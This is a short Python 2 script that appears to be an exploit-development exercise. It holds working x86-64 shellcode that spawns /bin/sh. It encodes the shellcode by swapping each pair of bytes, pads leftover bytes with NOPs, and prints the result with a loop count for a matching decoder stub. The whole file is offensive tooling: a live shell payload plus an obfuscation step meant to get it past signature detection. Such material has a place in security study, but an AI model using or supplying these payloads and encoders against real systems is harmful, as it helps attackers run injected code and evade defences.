#!/bin/python

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
encoded = ""
encoded2 = ""

print "Encoded shellcode..."

counter = 0
mirror = []
mirror2 = []

for x in bytearray(shellcode):
	mirror.insert(0,x)
	counter += 1
	if counter == 2:
		for y in mirror:
			mirror2.insert(0,y)
		counter = 0
		mirror = []
if counter <> 0:
	counter = 2 - counter
	print "there are some leftover bytes so we will add %d nop (0x90) instructions " %counter
	for y in mirror:
		mirror2.insert(0,y)
	for x in range(counter):
		mirror2.insert(0,144)
		

for x in mirror2:
	encoded += '\\x'
	encoded += '%02x' %x

	encoded2 += '0x'
	encoded2 += '%02x,' %x

print encoded
print encoded2

size = len(encoded)/4
halfsize = size/2
print 'Len: %d' % size 
print 'so set your decoder on %d loops' % halfsize
